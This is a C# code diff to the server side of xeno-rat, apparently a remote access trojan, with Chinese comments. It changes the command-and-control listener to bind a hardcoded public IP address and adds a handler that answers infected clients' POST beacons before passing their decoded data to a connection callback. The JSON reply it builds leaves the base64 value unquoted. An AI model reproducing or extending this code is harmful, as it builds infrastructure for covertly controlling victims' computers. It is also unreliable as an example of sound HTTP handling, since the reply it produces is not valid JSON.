@@ -8,6 +8,7 @@ using System.Windows.Forms;
 using System.Net.NetworkInformation;
 using System.IO;
 using Newtonsoft.Json;
+using System.Text;
 
 namespace xeno_rat_server
 {
@@ -111,8 +112,10 @@ namespace xeno_rat_server
 
         public async Task StartListening(Func<byte[], Task> connectCallBack)
         {
-            // TODO修改IP
+            // 测试服务器IP
             string url = "http://154.91.65.162:8080/api/connect/";
+            // 本机IP
+            //string url = "http://127.0.0.1:8080/api/connect/";
 
             HttpListener listener;
             try
@@ -134,6 +137,8 @@ namespace xeno_rat_server
                 {
                     HttpListenerContext context = await listener.GetContextAsync();
                     HttpListenerRequest request = context.Request;
+                    HttpListenerResponse response = context.Response;
+
                     MessageBox.Show("Received request: " + request.HttpMethod + context.Request.ContentType,  "Server.Listener");
                     // 检查请求方法是否为POST
                     if (request.HttpMethod == "POST")
@@ -152,8 +157,22 @@ namespace xeno_rat_server
                                     string dataBase64 = json["data"].ToString();
                                     byte[] dataBytes = Convert.FromBase64String(dataBase64);
                                     MessageBox.Show("Received POST request body: " + requestBody, "Server.Listener");
+
                                     if ("0".Equals(cmdType))
                                     {
+                                        // 处理请求并返回JSON结果
+                                        string responseData = "{\"message\": \"Hello from the server!\", \"receivedData\": " + dataBase64 + "}";
+
+                                        // 设置响应头
+                                        response.ContentType = "application/json";
+                                        response.ContentEncoding = Encoding.UTF8;
+
+                                        // 将JSON数据写入响应流
+                                        byte[] buffer = Encoding.UTF8.GetBytes(responseData);
+                                        response.ContentLength64 = buffer.Length;
+                                        response.OutputStream.Write(buffer, 0, buffer.Length);
+                                        response.OutputStream.Close();
+
                                         connectCallBack(dataBytes);
                                     }
                                     // 这里可以将 requestBody 反序列化为具体的对象进行处理
